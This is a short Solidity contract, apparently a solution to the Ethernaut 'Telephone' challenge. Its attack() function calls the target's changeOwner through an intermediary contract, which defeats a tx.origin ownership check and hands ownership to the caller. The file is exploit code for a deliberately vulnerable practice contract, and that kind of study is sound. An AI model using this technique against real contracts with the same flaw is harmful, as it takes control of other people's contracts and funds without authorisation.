//SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "interfaces/ITelephone.sol";

contract AttackTelephone {
    // from interface
    Telephone telephone;

    constructor(address _address) public {
        telephone = Telephone(_address);
    }

    function attack() public {
        telephone.changeOwner(msg.sender);
    }
}
